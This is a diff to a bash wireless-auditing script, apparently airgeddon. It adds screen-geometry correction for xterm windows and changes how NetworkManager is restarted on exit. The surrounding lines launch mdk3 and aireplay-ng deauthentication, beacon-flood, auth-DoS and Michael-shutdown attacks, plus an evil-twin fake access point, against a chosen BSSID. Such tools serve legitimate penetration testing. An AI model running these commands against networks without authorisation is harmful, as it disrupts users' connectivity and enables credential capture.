@@ -2289,6 +2289,7 @@ function monitor_option() {
 	if [ ${check_kill_needed} -eq 1 ]; then
 		language_strings ${language} 19 "blue"
 		${airmon} check kill > /dev/null 2>&1
+		nm_processes_killed=1
 	fi
 
 	new_interface=$(${airmon} start ${interface} 2> /dev/null | grep monitor)
@@ -2654,7 +2655,8 @@ function exec_mdk3deauth() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1
 }
 
 function exec_aireplaydeauth() {
@@ -2668,7 +2670,8 @@ function exec_aireplaydeauth() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1
 }
 
 function exec_wdsconfusion() {
@@ -2680,7 +2683,8 @@ function exec_wdsconfusion() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1
 }
 
 function exec_beaconflood() {
@@ -2692,7 +2696,8 @@ function exec_beaconflood() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h > /dev/null 2>&1
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h > /dev/null 2>&1
 }
 
 function exec_authdos() {
@@ -2704,7 +2709,8 @@ function exec_authdos() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024 > /dev/null 2>&1
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024 > /dev/null 2>&1
 }
 
 function exec_michaelshutdown() {
@@ -2716,7 +2722,8 @@ function exec_michaelshutdown() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+	apply_screen_correction ${g1_topleft_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024 > /dev/null 2>&1
 }
 
 function mdk3_deauth_option() {
@@ -3896,9 +3903,19 @@ function set_hostapd_config() {
 function launch_fake_ap() {
 
 	killall hostapd > /dev/null 2>&1
-	check_kill_needed=1
 	${airmon} check kill > /dev/null 2>&1
-	xterm -hold -bg black -fg blue -geometry ${g3_topleft_window} -T "AP" -e "hostapd \"$tmpdir$hostapd_file\"" > /dev/null 2>&1 &
+	nm_processes_killed=1
+
+	case ${et_mode} in
+		"et_onlyap")
+			hostapd_scr_window_position=${g1_topleft_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			hostapd_scr_window_position=${g3_topleft_window}
+		;;
+	esac
+	apply_screen_correction ${hostapd_scr_window_position}
+	xterm -hold -bg black -fg blue -geometry ${scrdata_corrected} -T "AP" -e "hostapd \"$tmpdir$hostapd_file\"" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 3
 }
@@ -3962,7 +3979,17 @@ function set_std_internet_routing_rules() {
 function launch_dhcp_server() {
 
 	killall dhcpd > /dev/null 2>&1
-	xterm -hold -bg black -fg pink -geometry ${g3_middleleft_window} -T "DHCP" -e "dhcpd -d -f -cf \"$tmpdir$dhcpd_file\" $interface 2>&1 | tee -a $tmpdir/clts.txt" > /dev/null 2>&1 &
+
+	case ${et_mode} in
+		"et_onlyap")
+			dchcpd_scr_window_position=${g1_bottomleft_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			dchcpd_scr_window_position=${g3_middleleft_window}
+		;;
+	esac
+	apply_screen_correction ${dchcpd_scr_window_position}
+	xterm -hold -bg black -fg pink -geometry ${scrdata_corrected} -T "DHCP" -e "dhcpd -d -f -cf \"$tmpdir$dhcpd_file\" $interface 2>&1 | tee -a $tmpdir/clts.txt" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 2
 }
@@ -3988,7 +4015,16 @@ function exec_et_deauth() {
 		;;
 	esac
 
-	xterm -hold -bg black -fg red -geometry ${g3_bottomleft_window} -T "Deauth" -e "$deauth_et_cmd" > /dev/null 2>&1 &
+	case ${et_mode} in
+		"et_onlyap")
+			deauth_scr_window_position=${g1_bottomright_window}
+		;;
+		"et_sniffing"|"et_sniffing_sslstrip"|"et_captive_portal")
+			deauth_scr_window_position=${g3_bottomleft_window}
+		;;
+	esac
+	apply_screen_correction ${deauth_scr_window_position}
+	xterm -hold -bg black -fg red -geometry ${scrdata_corrected} -T "Deauth" -e "$deauth_et_cmd" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 1
 }
@@ -4402,7 +4438,8 @@ function attack_handshake_menu() {
 				capture_handshake_window
 				rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
 				echo ${bssid} > ${tmpdir}"bl.txt"
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1 &
+				apply_screen_correction ${g1_bottomleft_window}
+				xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -4414,7 +4451,8 @@ function attack_handshake_menu() {
 			else
 				capture_handshake_window
 				${airmon} start ${interface} ${channel} > /dev/null 2>&1
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1 &
+				apply_screen_correction ${g1_bottomleft_window}
+				xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -4425,7 +4463,8 @@ function attack_handshake_menu() {
 				attack_handshake_menu "new"
 			else
 				capture_handshake_window
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1 &
+				apply_screen_correction ${g1_bottomleft_window}
+				xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1 &
 				sleeptimeattack=16
 			fi
 		;;
@@ -4452,7 +4491,8 @@ function capture_handshake_window() {
 	language_strings ${language} 115 "read"
 
 	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} > /dev/null 2>&1 &
+	apply_screen_correction ${g1_topright_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} > /dev/null 2>&1 &
 	processidcapture=$!
 }
 
@@ -4476,7 +4516,8 @@ function explore_for_targets_option() {
 	tmpfiles_toclean=1
 	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface} > /dev/null 2>&1
+	apply_screen_correction ${g1_topright_window}
+	xterm +j -sb -rightbar -geometry ${scrdata_corrected} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface} > /dev/null 2>&1
 	targetline=`cat ${tmpdir}"nws-01.csv" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 	targetline=`expr ${targetline} - 1`
 
@@ -4877,14 +4918,15 @@ function exit_script_option() {
 			${airmon} stop ${interface} > /dev/null 2>&1
 			time_loop
 			echo -e ${green_color}" Ok\r"${normal_color}
-
-			if [ ${check_kill_needed} -eq 1 ]; then
-				language_strings ${language} 168 "multiline"
-				eval ${networkmanager_cmd}" > /dev/null 2>&1"
-				time_loop
-				echo -e ${green_color}" Ok\r"${normal_color}
-			fi
 		fi
+	fi
+
+	if [ ${nm_processes_killed} -eq 1 ]; then
+		action_on_exit_taken=1
+		language_strings ${language} 168 "multiline"
+		eval ${networkmanager_cmd}" > /dev/null 2>&1"
+		time_loop
+		echo -e ${green_color}" Ok\r"${normal_color}
 	fi
 
 	if [ ${tmpfiles_toclean} -eq 1 ]; then
@@ -4996,6 +5038,7 @@ function special_distro_features() {
 	case ${distro} in
 		"Wifislax")
 			networkmanager_cmd="service restart networkmanager"
+			screen_correction_needed=1
 		;;
 		"SUSE"|"CentOS"|"Gentoo"|"Fedora"|"Red Hat")
 			networkmanager_cmd="service NetworkManager restart"
@@ -5263,10 +5306,12 @@ function initialize_script_settings() {
 
 	exit_code=0
 	check_kill_needed=0
+	nm_processes_killed=0
 	airmon_fix
 	autochanged_language=0
 	tmpfiles_toclean=0
 	routing_toclean=0
+	screen_correction_needed=0
 }
 
 function detect_screen_resolution() {
@@ -5314,12 +5359,12 @@ function set_windows_sizes() {
 					#Until 768 | 2)
 					set_windows_sizes_1280x768
 				;;
-				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-4])
-					#From 769 until 1024 | 2)
+				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-3])
+					#From 769 until 1023 | 2)
 					set_windows_sizes_1280x768
 				;;
 				*)
-					#From 1025 and so on | 3)
+					#From 1024 and so on | 3)
 					set_windows_sizes_1280x1024
 				;;
 			esac
@@ -5331,12 +5376,12 @@ function set_windows_sizes() {
 					#Until 768 | 4)
 					set_windows_sizes_1366x768
 				;;
-				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-4])
-					#From 769 until 1024 | 4)
+				769|7[7-9][0-9]|[8-9][0-9][0-9]|10[0-1][0-9]|102[0-3])
+					#From 769 until 1023 | 4)
 					set_windows_sizes_1366x768
 				;;
 				*)
-					#From 1025 and so on | 5)
+					#From 1024 and so on | 5)
 					set_windows_sizes_1366x1024
 				;;
 			esac
@@ -5357,6 +5402,21 @@ function set_windows_sizes() {
 			set_windows_sizes_standard
 		;;
 	esac
+}
+
+function apply_screen_correction() {
+
+	[[ ${1} =~ ^([0-9]+)x([0-9]+)([\+\-])([0-9]+)([\+\-])([0-9]+)$ ]] && scr1="${BASH_REMATCH[1]}" && scr2="${BASH_REMATCH[2]}" && scr3="${BASH_REMATCH[3]}" && scr4="${BASH_REMATCH[4]}" && scr5="${BASH_REMATCH[5]}" && scr6="${BASH_REMATCH[6]}"
+
+	if [ ${screen_correction_needed} -eq 1 ]; then
+		scr1=$(expr ${scr1} - 11)
+		scr2=$(expr ${scr2} - 1)
+		if [ ${scr6} -ne 0 ]; then
+			scr6=$(expr ${scr6} - 30)
+		fi
+	fi
+
+	scrdata_corrected="${scr1}x${scr2}${scr3}${scr4}${scr5}${scr6}"
 }
 
 function set_windows_sizes_standard() {
